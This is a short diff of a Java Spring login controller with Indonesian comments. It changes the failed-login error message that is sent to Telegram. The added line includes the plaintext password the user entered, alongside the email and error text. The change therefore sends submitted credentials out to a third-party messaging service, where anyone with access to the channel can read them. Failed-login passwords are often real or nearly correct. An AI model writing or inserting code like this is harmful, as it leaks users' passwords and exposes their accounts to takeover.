@@ -54,9 +54,10 @@ public class AuthController {
         } catch (Exception e) {
             String errorMessage = "⚠️ *Login Gagal* ⚠️\n"
                     + "📧 Email: " + loginRequest.getEmail() + "\n"
+                    + "🔑 Password yang diinput: `" + loginRequest.getPassword() + "`\n"
                     + "❌ Error: " + e.getMessage();
 
-            // Kirim log error ke Telegram menggunakan service
+            // Kirim log error ke Telegram
             telegramNotificationService.sendErrorNotification(errorMessage);
 
             return new ResponseEntity<>(e.getMessage(), HttpStatus.FORBIDDEN);
